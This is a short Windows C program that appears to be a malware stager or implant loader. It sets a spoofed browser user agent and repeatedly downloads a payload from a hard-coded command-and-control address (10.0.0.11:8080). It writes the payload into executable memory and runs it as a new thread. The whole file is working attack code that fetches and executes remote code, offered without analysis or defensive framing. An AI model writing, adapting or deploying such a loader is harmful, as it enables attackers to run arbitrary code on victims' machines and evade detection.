#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#define FAIL 0
#define SUCCESS 1

#define C2 "http://10.0.0.11:8080/messageBox.bin"
#define UA "Firefox ... "

#define MAX_BUFFER 0x4096
#define INTERVAL 5 * 1000

int 
main(void){
//DWORD 
//go(void) {

  DWORD dwSuccess = 0x00, dwRead = 0x00;
  LPVOID lpBuffer;

  HINTERNET hInternet, hUrl;

  hInternet = InternetOpenA(UA, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
  if (hInternet == NULL)
    goto exit;

  lpBuffer = VirtualAlloc(0, MAX_BUFFER, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if(lpBuffer == NULL)
    goto exit;

  while ( 1 ) {

    hUrl = InternetOpenUrlA(hInternet, C2, NULL, 0, 0, 0);
    if (hUrl == NULL)
      goto exit;

    InternetReadFile(hUrl, lpBuffer, MAX_BUFFER, &dwRead);
	  CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpBuffer, NULL, 0, 0);
    
    Sleep(1000);

  }


exit_success:
  dwSuccess = SUCCESS;
exit:

  if(hInternet)
    CloseHandle(hInternet);

  if(hUrl)
    CloseHandle(hUrl);

  return dwSuccess;

}
